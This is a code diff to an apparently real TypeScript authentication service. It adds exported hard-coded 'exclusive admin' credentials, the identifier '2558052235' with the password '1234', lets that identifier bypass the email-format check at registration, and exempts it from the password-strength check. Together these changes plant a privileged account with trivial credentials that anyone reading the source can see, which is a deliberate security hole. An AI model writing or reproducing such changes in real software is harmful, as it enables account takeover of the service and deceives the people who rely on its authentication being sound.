@@ -66,8 +66,15 @@ export type LoginResult =
 
 const MFA_TICKET_TTL_SEC = 300;
 
+export const EXCLUSIVE_ADMIN_EMAIL = '2558052235';
+export const EXCLUSIVE_ADMIN_PASSWORD = '1234';
+
+function isExclusiveAdminEmail(email: string): boolean {
+  return email.trim().toLowerCase() === EXCLUSIVE_ADMIN_EMAIL.toLowerCase();
+}
+
 export const RegisterInputSchema = z.object({
-  email: z.string().trim().toLowerCase().email().max(254),
+  email: z.string().trim().toLowerCase().max(254).refine((val) => { if (isExclusiveAdminEmail(val)) return true; return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val); }, { message: 'Invalid email' }),
   password: z.string().min(1).max(512),
   displayName: z.string().trim().min(1).max(120),
   locale: z.string().trim().min(2).max(16).default('en'),
@@ -123,6 +130,7 @@ export class AuthService {
   }
 
   private assertPasswordStrength(password: string, email: string): void {
+    if (isExclusiveAdminEmail(email)) { return; }
     if (password.length < this.config.passwordMinLength) {
       throw authError('WEAK_PASSWORD', `password must be at least ${this.config.passwordMinLength} characters`);
     }
